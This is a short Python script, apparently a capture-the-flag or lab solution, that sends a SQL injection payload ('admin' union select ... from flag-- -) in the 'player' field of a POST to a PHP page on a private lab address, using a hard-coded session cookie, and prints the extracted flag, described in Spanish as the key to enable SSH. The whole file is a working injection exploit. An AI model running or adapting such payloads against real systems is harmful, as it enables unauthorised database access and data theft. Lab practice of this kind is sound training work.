#!/usr/bin/python3

import requests
import warnings

warnings.simplefilter("ignore")

target = "http://10.10.11.128/index.php"
cookies = {'PHPSESSID': '3tr0n2hahg4g9htp7ou1lcukmr'}

data = {
    'player': "admin' union select group_concat(one) from flag-- -",
}

response = requests.post(target, data=data, cookies=cookies)
print("Flag para activar SSH: ", response.text)
